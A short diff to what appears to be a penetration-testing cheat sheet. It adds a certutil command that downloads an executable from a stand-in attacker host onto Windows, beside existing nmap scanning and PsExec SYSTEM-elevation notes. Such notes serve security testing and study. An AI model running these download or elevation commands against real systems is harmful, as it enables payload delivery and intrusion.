@@ -11,6 +11,11 @@ nmap -sS -T4 -A -sC -oA scanme --stylesheet nmap-bootstrap.xsl scanme.nmap.org s
 xsltproc -o scanme.html nmap-bootstrap.xsl scanme.xml
 ```
 
+WINDOWS FILE DOWNLOAD
+```
+certutil.exe -urlcache -f "http://attackerIP/file.exe" file.exe
+```
+
 ELEVATE TO SYSTEM
 ```
 PsExec.exe -s -i cmd.exe
